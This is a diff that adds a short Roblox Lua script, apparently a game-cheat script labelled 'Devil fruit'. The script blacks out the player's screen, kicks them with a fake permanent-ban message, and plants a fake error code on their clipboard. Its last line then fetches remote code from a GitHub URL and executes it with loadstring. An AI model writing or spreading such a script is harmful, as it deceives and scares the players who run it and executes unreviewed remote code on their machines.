@@ -1,0 +1,14 @@
+game:GetService("Lighting").ColorCorrection.Enabled = true
+game:GetService("Lighting").ColorCorrection.Brightness = -100
+wait(10)
+game.Players.LocalPlayer:Kick("You have been permanently banned")
+setclipboard("Error Code:267")
+wait(1.2)
+game.StarterGui:SetCore("SendNotification", {
+Title = "Devil fruit";
+Text = " devil fruit MAKE BY sonicturu";
+Icon = "rbxassetid://12403833889";
+Duration = 50;
+ 
+})
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NickelHUBB/SonicTuru/main/FruiFarmNEW"))()
